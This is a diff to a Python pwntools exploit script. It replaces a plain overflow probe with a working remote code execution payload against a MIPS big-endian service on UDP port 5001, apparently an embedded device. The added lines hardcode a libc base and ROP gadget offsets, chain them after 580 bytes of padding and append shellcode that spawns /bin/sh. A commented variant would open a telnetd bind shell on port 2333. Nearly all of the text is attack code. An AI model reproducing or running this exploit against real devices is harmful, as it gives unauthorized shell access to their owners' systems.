@@ -40,9 +40,24 @@ if __name__ == '__main__':
     port = 5001
     host = (ip, port)
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    context.arch = "mips"
+    context.endian = "big"
+    #shellcode = asm(shellcraft.execve(path = "/bin/sh",argv=['sh', '-c', 'telnetd -p 2333 -l /bin/sh']))
+    shellcode = asm(shellcraft.mips.linux.sh())
+    libc_addr = 0x90063000
+    addr1 =  0x000512C0
+    addr2 = 0x00035348
+    addr_sleep = 0x000500F0
+    addr3 = 0x000305B0
+    addr4 = 0x0000B5F0
+    s1 = p32(libc_addr + addr2 )
+    s2 = p32(libc_addr + addr_sleep)
+    s3 = b"BBBB"
+    s4 = p32(libc_addr + addr4)
+    ra = p32(libc_addr+addr1)
 
-    payload = "A"*596 
-
+    payload = b"A"*580 + s1 + s2 + s3 + s4 + ra + b"A"*36 + p32(libc_addr+addr3)+ b"D"*24+shellcode 
     data = gen_udp_data(payload)
     print ("[+]Sending payload...")
     sock.sendto(data, host)
